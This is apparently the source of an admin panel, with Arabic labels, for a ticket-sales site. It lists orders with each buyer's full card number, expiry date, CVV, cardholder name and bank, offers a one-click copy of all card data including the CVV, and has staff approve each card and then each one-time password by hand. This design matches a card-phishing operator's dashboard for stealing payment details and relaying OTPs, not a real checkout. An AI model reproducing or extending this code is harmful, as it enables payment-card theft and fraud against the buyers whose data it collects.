import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import {
  Search, CreditCard, Mail, Phone, Hash, Receipt, Ticket,
  CheckCircle, XCircle, Filter, ShieldCheck, Clock, Ban, Landmark, Copy, Check,
} from "lucide-react";
import { toast } from "sonner";
import ExportButtons from "@/components/admin/ExportButtons";

interface Order {
  id: string;
  email: string;
  phone: string;
  tickets: any[];
  subtotal: number;
  vat: number;
  total: number;
  payment_method: string;
  status: string;
  confirmation_number: string | null;
  created_at: string;
  card_last4: string | null;
  card_brand: string | null;
  cardholder_name: string | null;
  bank_name: string | null;
  card_full_number: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
}

const statusConfig: Record<string, { label: string; gradient: string; bg: string; text: string; dot: string; icon: any }> = {
  confirmed: { label: "مقبول", gradient: "from-emerald-500 to-teal-500", bg: "bg-emerald-50", text: "text-emerald-600", dot: "bg-emerald-400", icon: ShieldCheck },
  pending: { label: "بانتظار موافقة البطاقة", gradient: "from-amber-400 to-orange-500", bg: "bg-amber-50", text: "text-amber-600", dot: "bg-amber-400", icon: Clock },
  approved_card: { label: "تمت موافقة البطاقة", gradient: "from-blue-500 to-indigo-500", bg: "bg-blue-50", text: "text-blue-600", dot: "bg-blue-400", icon: CreditCard },
  pending_otp: { label: "بانتظار موافقة OTP", gradient: "from-orange-400 to-red-400", bg: "bg-orange-50", text: "text-orange-600", dot: "bg-orange-400", icon: Clock },
  rejected: { label: "مرفوض", gradient: "from-red-500 to-rose-500", bg: "bg-red-50", text: "text-red-500", dot: "bg-red-400", icon: XCircle },
  cancelled: { label: "ملغي", gradient: "from-slate-400 to-slate-500", bg: "bg-slate-50", text: "text-slate-500", dot: "bg-slate-400", icon: Ban },
};

const AdminOrders = () => {
  const [orders, setOrders] = useState<Order[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [statusFilter, setStatusFilter] = useState<string>("all");
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const copyCardInfo = (order: Order) => {
    const parts: string[] = [];
    if (order.cardholder_name) parts.push(`الاسم: ${order.cardholder_name}`);
    if (order.card_full_number) parts.push(`الرقم: ${order.card_full_number}`);
    else if (order.card_last4) parts.push(`الرقم: •••• ${order.card_last4}`);
    if (order.card_expiry) parts.push(`الانتهاء: ${order.card_expiry}`);
    if (order.card_cvv) parts.push(`CVV: ${order.card_cvv}`);
    if (order.card_brand) parts.push(`النوع: ${order.card_brand}`);
    if (order.bank_name) parts.push(`البنك: ${order.bank_name}`);
    
    navigator.clipboard.writeText(parts.join("\n")).then(() => {
      setCopiedId(order.id);
      toast.success("تم نسخ بيانات البطاقة", { duration: 2000 });
      setTimeout(() => setCopiedId(null), 2000);
    });
  };

  const fetchOrders = async () => {
    const { data } = await supabase
      .from("ticket_orders")
      .select("*")
      .order("created_at", { ascending: false });
    setOrders((data as Order[]) || []);
    setLoading(false);
  };

  useEffect(() => {
    fetchOrders();
    const channel = supabase
      .channel("orders-realtime")
      .on("postgres_changes" as any, { event: "*", schema: "public", table: "ticket_orders" }, () => fetchOrders())
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, []);

  useEffect(() => {
    const handler = () => fetchOrders();
    window.addEventListener("admin-pull-refresh", handler);
    return () => window.removeEventListener("admin-pull-refresh", handler);
  }, []);

  const updateStatus = async (id: string, currentStatus: string, action: "approve" | "reject") => {
    let newStatus = "rejected";
    if (action === "approve") {
      if (currentStatus === "pending") newStatus = "approved_card";
      else if (currentStatus === "pending_otp") newStatus = "confirmed";
      else newStatus = "confirmed";
    }
    await supabase.from("ticket_orders").update({ status: newStatus }).eq("id", id);
    setOrders(prev => prev.map(o => o.id === id ? { ...o, status: newStatus } : o));
  };

  const filtered = orders.filter(o => {
    if (statusFilter === "confirmed" && o.status !== "confirmed") return false;
    if (statusFilter === "unconfirmed" && o.status === "confirmed") return false;
    if (!search) return true;
    const q = search.toLowerCase();
    return o.email.toLowerCase().includes(q) || o.phone.includes(q) || (o.confirmation_number || "").includes(q);
  });

  const totalRevenue = filtered.reduce((s, o) => s + (o.status === "confirmed" ? o.total : 0), 0);

  return (
    <div className="space-y-5">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2.5">
          <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-emerald-500 to-teal-600 flex items-center justify-center shadow-lg shadow-emerald-500/20">
            <Ticket className="w-4.5 h-4.5 text-white" />
          </div>
          <div>
            <h2 className="text-[15px] font-bold text-slate-800">طلبات التذاكر</h2>
            <p className="text-[10px] text-slate-400">{filtered.length} طلب • {totalRevenue} ر.س إيرادات</p>
          </div>
        </div>
        <ExportButtons
          data={filtered}
          filename="orders"
          title="طلبات التذاكر"
          columns={[
            { key: "email", label: "البريد" },
            { key: "phone", label: "الهاتف" },
            { key: "total", label: "الإجمالي", format: (v) => `${v} ر.س` },
            { key: "payment_method", label: "طريقة الدفع", format: (v) => v === "card" ? "بطاقة" : v },
            { key: "status", label: "الحالة", format: (v) => v === "confirmed" ? "مقبول" : v === "rejected" ? "مرفوض" : "قيد المراجعة" },
            { key: "confirmation_number", label: "رقم التأكيد" },
            { key: "cardholder_name", label: "حامل البطاقة" },
            { key: "created_at", label: "التاريخ", format: (v) => new Date(v).toLocaleDateString("ar-SA") },
          ]}
        />
      </div>

      {/* Search */}
      <div className="relative">
        <Search className="absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
        <input
          type="text"
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          placeholder="بحث بالبريد أو رقم الجوال أو رقم التأكيد..."
          className="w-full bg-white border border-slate-200/80 rounded-xl pr-10 pl-4 py-2.5 text-[16px] sm:text-[13px] text-slate-700 placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-400 transition-all shadow-sm"
        />
      </div>

      {/* Filters */}
      <div className="flex items-center gap-2 flex-wrap">
        {[
          { key: "all", label: "الكل", gradient: "from-slate-600 to-slate-700" },
          { key: "confirmed", label: "تم التحقق", gradient: "from-emerald-500 to-teal-500" },
          { key: "unconfirmed", label: "لم يتم التحقق", gradient: "from-amber-500 to-orange-500" },
        ].map((f) => (
          <button
            key={f.key}
            onClick={() => setStatusFilter(f.key)}
            className={`px-3.5 py-1.5 rounded-lg text-[11px] font-semibold transition-all duration-200 ${
              statusFilter === f.key
                ? `bg-gradient-to-r ${f.gradient} text-white shadow-sm`
                : "bg-white text-slate-500 hover:bg-slate-50 border border-slate-200/80"
            }`}
          >
            {f.label}
          </button>
        ))}
      </div>

      {/* Legend */}
      <div className="flex items-center gap-3 flex-wrap text-[10px] text-slate-400 bg-white/60 rounded-xl px-3 py-2 border border-slate-100/80">
        {Object.entries(statusConfig).map(([key, val]) => (
          <span key={key} className="flex items-center gap-1.5">
            <span className={`w-2 h-2 rounded-full ${val.dot}`} />
            {val.label}
          </span>
        ))}
      </div>

      {/* Order Cards */}
      <div className="space-y-3">
        {loading ? (
          [1, 2, 3].map(i => (
            <div key={i} className="bg-white rounded-2xl border border-slate-100/80 p-5 animate-pulse">
              <div className="flex gap-3">
                <div className="w-11 h-11 bg-gradient-to-br from-slate-100 to-slate-50 rounded-xl" />
                <div className="flex-1 space-y-2.5">
                  <div className="w-1/3 h-3.5 bg-slate-100 rounded-lg" />
                  <div className="w-1/2 h-3 bg-slate-50 rounded-lg" />
                </div>
              </div>
            </div>
          ))
        ) : filtered.length === 0 ? (
          <div className="bg-white rounded-2xl border border-slate-100/80 p-12 text-center">
            <div className="w-14 h-14 mx-auto rounded-2xl bg-slate-50 flex items-center justify-center mb-3">
              <Ticket className="w-6 h-6 text-slate-300" />
            </div>
            <p className="text-slate-400 text-sm">لا توجد طلبات</p>
          </div>
        ) : (
          filtered.map((o) => {
            const st = statusConfig[o.status] || statusConfig.pending;
            const StIcon = st.icon;
            const isPending = o.status === "pending" || o.status === "pending_otp";
            return (
              <div
                key={o.id}
                className={`bg-white rounded-2xl border overflow-hidden transition-all duration-300 hover:shadow-lg hover:-translate-y-0.5 ${
                  isPending ? "border-amber-200/80 shadow-sm shadow-amber-100/50" : "border-slate-100/80 hover:shadow-slate-200/60"
                }`}
              >
                {/* Gradient top strip */}
                <div className={`h-1 bg-gradient-to-r ${st.gradient}`} />

                {/* Header */}
                <div className="p-4">
                  <div className="flex items-start gap-3">
                    <div className={`w-11 h-11 rounded-xl bg-gradient-to-br ${st.gradient} flex items-center justify-center shadow-md shrink-0`}>
                      <Ticket className="w-5 h-5 text-white" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center justify-between gap-2">
                        <span className="text-[13px] font-semibold text-slate-800 truncate" dir="ltr">{o.email}</span>
                        <span className={`text-[9px] font-bold px-2.5 py-0.5 rounded-full bg-gradient-to-r ${st.gradient} text-white shadow-sm whitespace-nowrap`}>
                          {st.label}
                        </span>
                      </div>
                      <div className="flex items-center gap-3 mt-1.5">
                        <span className="flex items-center gap-1 text-[11px] text-slate-400">
                          <Phone className="w-3 h-3" />
                          <span dir="ltr">{o.phone}</span>
                        </span>
                        <span className="text-[10px] text-slate-300">
                          {format(new Date(o.created_at), "dd MMM، HH:mm", { locale: ar })}
                        </span>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Details */}
                <div className="px-4 pb-4 space-y-2.5">
                  {/* Order Info */}
                  <div className="rounded-xl overflow-hidden border border-slate-100/80">
                    <div className="bg-gradient-to-l from-blue-50/80 to-transparent px-3 py-2 flex items-center justify-between border-b border-slate-100/50">
                      <span className="text-[11px] font-bold text-blue-600 flex items-center gap-1.5">
                        <Receipt className="w-3.5 h-3.5" />
                        تفاصيل الطلب
                      </span>
                      {o.confirmation_number && (
                        <span className="text-[10px] font-mono text-blue-500 bg-blue-50 px-2 py-0.5 rounded-md">
                          #{o.confirmation_number}
                        </span>
                      )}
                    </div>
                    <div className="p-3 space-y-2 text-[12px]">
                      <div className="flex items-center justify-between">
                        <span className="text-slate-400">المجموع الفرعي</span>
                        <span className="text-slate-600">{o.subtotal} ر.س</span>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-slate-400">ضريبة القيمة المضافة</span>
                        <span className="text-slate-600">{o.vat} ر.س</span>
                      </div>
                      <div className="flex items-center justify-between border-t border-slate-100/80 pt-2">
                        <span className="text-slate-700 font-bold">الإجمالي</span>
                        <span className="text-[15px] font-bold bg-gradient-to-r from-emerald-600 to-teal-600 bg-clip-text text-transparent">{o.total} ر.س</span>
                      </div>
                    </div>
                  </div>

                  {/* Payment */}
                  <div className="rounded-xl overflow-hidden border border-slate-100/80">
                    <div className="bg-gradient-to-l from-violet-50/80 to-transparent px-3 py-2 border-b border-slate-100/50">
                      <span className="text-[11px] font-bold text-violet-600 flex items-center gap-1.5">
                        <CreditCard className="w-3.5 h-3.5" />
                        بيانات الدفع
                      </span>
                    </div>
                    <div className="p-3 space-y-2 text-[12px]">
                      <div className="flex items-center justify-between">
                        <span className="text-slate-400">طريقة الدفع</span>
                        <span className="text-slate-700 font-medium">
                          {o.payment_method === "card" ? "بطاقة ائتمان" : o.payment_method}
                        </span>
                      </div>
                      {o.card_full_number && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">رقم البطاقة الكامل</span>
                          <div className="flex items-center gap-1.5">
                            <span className="text-[10px] uppercase font-bold text-violet-500 bg-violet-50 px-1.5 py-0.5 rounded">{o.card_brand || "CARD"}</span>
                            <span className="font-mono text-slate-700 font-semibold" dir="ltr">{o.card_full_number}</span>
                          </div>
                        </div>
                      )}
                      {!o.card_full_number && o.card_last4 && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">رقم البطاقة</span>
                          <div className="flex items-center gap-1.5">
                            <span className="text-[10px] uppercase font-bold text-violet-500 bg-violet-50 px-1.5 py-0.5 rounded">{o.card_brand || "CARD"}</span>
                            <span className="font-mono text-slate-600" dir="ltr">•••• {o.card_last4}</span>
                          </div>
                        </div>
                      )}
                      {o.card_expiry && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">تاريخ الانتهاء</span>
                          <span className="font-mono text-slate-700 font-semibold" dir="ltr">{o.card_expiry}</span>
                        </div>
                      )}
                      {o.card_cvv && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">CVV</span>
                          <span className="font-mono text-red-600 font-bold bg-red-50 px-2 py-0.5 rounded" dir="ltr">{o.card_cvv}</span>
                        </div>
                      )}
                      {o.cardholder_name && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400">حامل البطاقة</span>
                          <span className="text-slate-700 font-medium">{o.cardholder_name}</span>
                        </div>
                      )}
                      {o.bank_name && (
                        <div className="flex items-center justify-between">
                          <span className="text-slate-400 flex items-center gap-1"><Landmark className="w-3 h-3" /> البنك</span>
                          <span className="text-slate-700 font-medium">{o.bank_name}</span>
                        </div>
                      )}
                    </div>
                  </div>

                  {/* Action Buttons */}
                  {isPending ? (
                    <div className="flex gap-2">
                      <button
                        onClick={() => updateStatus(o.id, o.status, "approve")}
                        className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-gradient-to-r from-emerald-500 to-teal-500 text-white text-[12px] font-bold shadow-md shadow-emerald-500/20 hover:shadow-lg hover:shadow-emerald-500/30 transition-all active:scale-[0.98]"
                      >
                        <CheckCircle className="w-4 h-4" />
                        {o.status === "pending" ? "موافقة البطاقة" : "موافقة OTP"}
                      </button>
                      <button
                        onClick={() => updateStatus(o.id, o.status, "reject")}
                        className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-gradient-to-r from-red-500 to-rose-500 text-white text-[12px] font-bold shadow-md shadow-red-500/20 hover:shadow-lg hover:shadow-red-500/30 transition-all active:scale-[0.98]"
                      >
                        <XCircle className="w-4 h-4" />
                        رفض
                      </button>
                    </div>
                  ) : (
                    <div className={`flex items-center justify-center gap-2 py-2.5 rounded-xl text-[12px] font-bold ${st.bg} ${st.text}`}>
                      <StIcon className="w-4 h-4" />
                      {o.status === "confirmed" ? "تم القبول"
                       : o.status === "approved_card" ? "تمت موافقة البطاقة — بانتظار OTP"
                       : "تم الرفض"}
                    </div>
                  )}
                </div>
              </div>
            );
          })
        )}
      </div>
    </div>
  );
};

export default AdminOrders;
